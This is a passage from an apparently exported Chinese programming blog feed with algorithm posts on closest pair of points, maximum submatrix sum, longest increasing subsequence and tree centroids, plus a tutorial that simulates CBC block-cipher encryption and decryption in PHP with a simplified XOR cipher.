&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先按照x坐标进行排序</span></span><br><span class="line">    q_sort(<span class="number">1</span>, n);</span><br><span class="line">    </span><br><span class="line">    min_d = find_minD(<span class="number">1</span>, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>,min_d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算法复杂度是：O（nlogn）</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>最大子矩阵和</title>
    <url>/2021/04/11/%E6%9C%80%E5%A4%A7%E5%AD%90%E7%9F%A9%E9%98%B5%E5%92%8C/</url>
    <content><![CDATA[<p>最大子矩阵和，可以使用动态规划的思想 </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">101</span>][<span class="number">101</span>], sums[<span class="number">101</span>][<span class="number">101</span>], temp[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oneMatMaxSum</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nowSum = <span class="number">0</span>, maxSum = <span class="number">-128</span> * <span class="number">100</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nowSum &gt; <span class="number">0</span>)nowSum += temp[i];</span><br><span class="line">        <span class="keyword">else</span> nowSum = temp[i];</span><br><span class="line">        maxSum = <span class="built_in">max</span>(maxSum, nowSum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给出一个方针  求最大子矩阵和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">            sums[i][j] = num[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            sums[i][j] += sums[i - <span class="number">1</span>][j];</span><br><span class="line">    <span class="keyword">int</span> maxSum = <span class="number">-128</span>, nowSum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="comment">// temp 保存的是从 第 i 行到 第 j 行所对应的矩阵每一列的和</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k  = <span class="number">0</span>; k &lt; n;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>)temp[k] = sums[j][k];</span><br><span class="line">                <span class="keyword">else</span> temp[k] = sums[j][k] - sums[i - <span class="number">1</span>][k];</span><br><span class="line">            &#125;</span><br><span class="line">            nowSum = oneMatMaxSum();</span><br><span class="line">            maxSum = <span class="built_in">max</span>(nowSum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; maxSum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>最长递增子序列(LIS)</title>
    <url>/2020/08/24/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97-LIS/</url>
    <content><![CDATA[<p>暴力法：将所有的排列组合枚举，计算最长的长度，时间复杂度：<code>O(n!)</code>，<strong>不可行！</strong></p>
<p>法二：将原序列<code>A</code>复制并升序得到<code>A&#39;</code>，求<code>A</code> 和<code>A&#39;</code>最长公共子序列的长度，即为所求，时间复杂度是<code>O(n^2)</code></p>
<p>下面介绍另外的两种方法：<a id="more"></a></p>
<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转移状态： dp[i] = max&#123;0,dp[j]&#125; + 1, 0 &lt; j &lt; i</span></span><br><span class="line"><span class="comment"> * O(n^2)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByDp</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxLen = <span class="number">1</span>, largerLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        largerLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[j] &gt; largerLen &amp;&amp; nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                largerLen = dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i] = largerLen + <span class="number">1</span>;</span><br><span class="line">        maxLen = maxLen &gt; dp[i] ? maxLen : dp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxLen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * O(nlogn)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByD</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    d[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &gt; d[lastIndex]) &#123;</span><br><span class="line">            d[++lastIndex] = nums[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> j = lower_bound(d, <span class="number">0</span>, lastIndex, nums[i]);</span><br><span class="line">            d[j] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lastIndex + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] d, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; d[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>LIS</tag>
      </tags>
  </entry>
  <entry>
    <title>带你了解CBC解密</title>
    <url>/2022/07/09/%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3CBC%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/1001b4c2adeb" target="_blank" rel="noopener">https://www.jianshu.com/p/1001b4c2adeb</a></p>
<p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>CBC</code>加密技术属于分组模式加密指将前一个密文分组与当前明文分组的内容混合起来进行加密，这样就可以避免<code>ECB</code>模式的弱点。</p>
<blockquote>
<p>对给定的随机密钥，每一块明文对应固定的密文块，即相同的明文组蕴含着相同的密文组，类似电码本的码字，这就是ECB模式</p>
</blockquote>
<p><code>CBC</code>模式的全称Cipher Block Chaining 模式（密文分组组链接模式），之所以叫这个名字是因为密文分组是像链条一样相互连接在一起。</p>
<p>本文参考自文章<a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">【Bugku Login4 (CBC字节翻转攻击)】</a></p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>先看流程图：<br><img src="https://cdn.yalexin.top/image-20220709182948691.png" alt="image-20220709182948691"></p>
<ol>
<li>分组：加密之前，先将要传输或者加密的明文数据进行分组，通常按照16个字节分为一组，如果最后一组不够16个字节，则会通过<code>\x0n</code>来补充，n代表补充的个数，例如最后一组的数组如果只有14个字节，那么后面两个字节以<code>\x02</code>进行填充，如果缺失的数目超过了10，则使用进十六制，例如如果最后一组数据只有6字节，那么最后10个字节都使用<code>\x0a</code>进行填充。我们称该明文为<code>plain</code>，每段明文我们成为<code>plain[i]</code></li>
<li>生成初始化向量：向量长度和分组长度一致，用于和第一组向量进行异或运算。我们称该向量为<code>iv</code></li>
<li>初始向量和第一段明文<code>plain[1]</code>进行异或运算，完事以后再经过特定的加密运算<code>encrypt()</code>，得到密文<code>cipher[1]</code></li>
<li><code>cipher[1]</code>继续和明文<code>plain[2]</code>进行异或运算，完事以后再经过特定的加密运算<code>encrypt()</code>，得到密文<code>cipher[2]</code></li>
<li>……</li>
<li>所有的明文都参与运算以后，将得到的<code>cipher[i]</code>组装合并，得到密文段。</li>
</ol>
<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>解密过程实际上就是将加密过程逆着走一遍。</p>
<p>此外，我们还应该明白异或的原理：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 ⊕ 1 = 1</span><br><span class="line">x ⊕ x = 0</span><br><span class="line">x ⊕ 0 = x</span><br></pre></td></tr></table></figure>

<p>如果数据<code>A</code>和密钥<code>B</code>异或得到密文<code>C</code>，要想恢复<code>A</code>，只要拿着密钥<code>B</code>再和密文<code>C</code>异或，即可恢复明文<code>A</code>，这是因为异或满足结合律，且：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A ⊕ B = C</span><br><span class="line">则有：</span><br><span class="line">A ⊕ B ⊕ B = C ⊕ B</span><br><span class="line">即：</span><br><span class="line">A ⊕ 0 = C ⊕ B</span><br><span class="line">即：</span><br><span class="line">A = C ⊕ B</span><br></pre></td></tr></table></figure>

<p>还是先看流程图：</p>
<p><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt="image-20220709185258788"></p>
<ol>
<li>分组：与明文分组长度一致。</li>
<li>将第一段密文<code>cipher[1]</code>进行解密<code>decrypt()</code>，该解密运算使用的函数应该和之前加密定义的函数互为逆函数，得到的中间数据再和之前加密过程定义的<code>iv</code>向量进行异或运算，即可获得第一段明文<code>plain[1]</code>。</li>
<li>第一段密文<code>cipher[1]</code>再和经过解密后的第二段密文<code>cipher[2]</code>进行异或运算，得到第二代明文<code>plain[2]</code></li>
<li>……</li>
<li>将得到的所有明文段组装，形成明文。</li>
</ol>
<h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>下面我将使用<code>PHP</code>代码模拟上述过程，为了简单起见，加密函数<code>encrypt()</code>就不写那么复杂，直接将待加密的数据和密钥异或，解密的时候将密文和密钥异或即可。</p>
<p>下面是<code>CBC</code>加密和解码的模拟：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// 产生长度为 16字节 的随机 iv 向量，一个字符在计算机内部使用8比特表示，即一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段明文都要进行加密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 上一段密文先和本明文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再进行加密</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; $iv,</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; $cipher</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段密文都要进行解密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 先进行解密</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再和上一段密文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mydata = <span class="string">"hello, everybody, this is a string for test....."</span>;</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"数据是：\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"加密后："</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"根据加密后得到的密文进行解密，得到的数据："</span> . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220710144743355.png" alt="image-20220710144743355"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>树的重心</title>
    <url>/2021/04/18/%E6%A0%91%E7%9A%84%E9%87%8D%E5%BF%83/</url>
    <content><![CDATA[<blockquote>
<p>本文参考洛谷对于<a href="https://www.luogu.com.cn/problem/solution/P1364" target="_blank" rel="noopener">P1364</a>的题解</p>
</blockquote>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> 对于树上的每一个点，计算其所有子树中最大的子树节点数，这个值最小的点就是这棵树的重心。 <a id="more"></a></p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul>
<li>树中所有点到某个点的距离和中，到重心的距离和是最小的，如果有两个重心，他们的距离和一样 </li>
<li>插入或删除一个点，树的重心的位置最多移动一个单位。 </li>
<li>把两棵树通过一条边相连，新的树的重心在原来两棵树重心的连线上。 </li>
</ul>
<p>这些性质我就不证明了，<del>比较懒</del>（不太懂证明）</p>
<h2 id="求法"><a href="#求法" class="headerlink" title="求法"></a>求法</h2><h3 id="无权树"><a href="#无权树" class="headerlink" title="无权树"></a>无权树</h3><p>实际上，一个如果定义<code>size[i]</code>为以<code>i</code>节点的为根的子树的节点个数，可以很轻易地得到</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="23.361ex" height="5.447ex" viewbox="0 -1250 10325.7 2407.8" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-2-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/><path id="MJX-2-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/><path id="MJX-2-TEX-I-1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/><path id="MJX-2-TEX-N-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/><path id="MJX-2-TEX-I-1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-N-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/><path id="MJX-2-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path id="MJX-2-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path id="MJX-2-TEX-LO-2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"/><path id="MJX-2-TEX-I-1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(2023, 0)"><use xlink:href="#MJX-2-TEX-I-1D462"/></g><g data-mml-node="mo" transform="translate(2595, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g><g data-mml-node="mo" transform="translate(3150.8, 0)"><use xlink:href="#MJX-2-TEX-N-3D"/></g><g data-mml-node="mn" transform="translate(4206.6, 0)"><use xlink:href="#MJX-2-TEX-N-31"/></g><g data-mml-node="mo" transform="translate(4928.8, 0)"><use xlink:href="#MJX-2-TEX-N-2B"/></g><g data-mml-node="munderover" transform="translate(5929, 0)"><g data-mml-node="mo"><use xlink:href="#MJX-2-TEX-LO-2211"/></g><g 